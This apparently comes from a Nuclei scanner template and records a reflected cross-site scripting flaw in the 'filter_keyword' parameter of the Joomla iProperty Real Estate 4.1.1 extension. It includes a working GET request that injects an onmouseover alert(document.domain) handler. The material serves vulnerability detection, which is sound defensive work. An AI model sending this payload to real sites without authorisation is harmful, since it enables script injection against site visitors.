# Vulnerability: Joomla iProperty Real Estate 4.1.1 - Cross-Site Scripting
**Classification:** JOOMLA
**Source:** Nuclei Template (`joomla-iproperty-real-estate-xss.yaml`)

## Description
Joomla extension iproperty is vulnerable to XSS in GET parameter 'filter_keyword'.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1
```

